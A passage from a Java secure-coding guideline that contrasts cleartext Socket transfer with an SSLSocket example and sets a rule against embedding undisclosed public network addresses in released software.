    //Close the stream
}
```

This noncompliant code example uses Socket to transfer cleartext packets. Sensitive information, if any, in the packets may be leaked or tampered with.

**\[Compliant Code Example]**

```java
try {
    SSLSocketFactory sslSocketFactory =
        (SSLSocketFactory) SSLSocketFactory.getDefault();
    SSLSocket sslSocket = (SSLSocket) sslSocketFactory.createSocket(ip, port);
    os = sslSocket.getOutputStream();
    os.write(userInfo.getBytes(StandardCharsets.UTF_8));
    ...
} catch (IOException ex) {
    //Handle the exception
} finally {
    //Close the stream
}
```

This compliant code example uses SSLSocket to protect packets using SSL/TLS.

**\[Exception]**

The mechanisms that SSLSocket provides to ensure the secure transfer of packets may result in significant performance overhead. Regular sockets are sufficient under the following circumstances:

- The data being sent over the socket is not sensitive.
- The data is sensitive but properly encrypted.

#### Avoid public network addresses in code



**\[Description]**

Providing public network addresses that are invisible and unknown to users in code or scripts can raise doubts among customers.

Public network addresses (including public IP addresses, public URLs/domain names, and email addresses) contained in the released software (including software packages and patch packages) must meet the following requirements: 
1\. Avoid public network addresses that are invisible on UIs or not disclosed in product documentation. 
2\. Do not write disclosed public IP addresses in code or scripts. They can be stored in configuration files or databases.

The public IP addresses built in open-source or third-party software must meet the first requirement.

**\[Exception]**

This requirement is not mandatory when public network addresses must be specified as required by standard protocols. For example, an assembled public network URL must be specified for the namespace of functions based on the SOAP protocol. W3.org addresses on HTTP pages and feature names in XML parsers are also exceptions.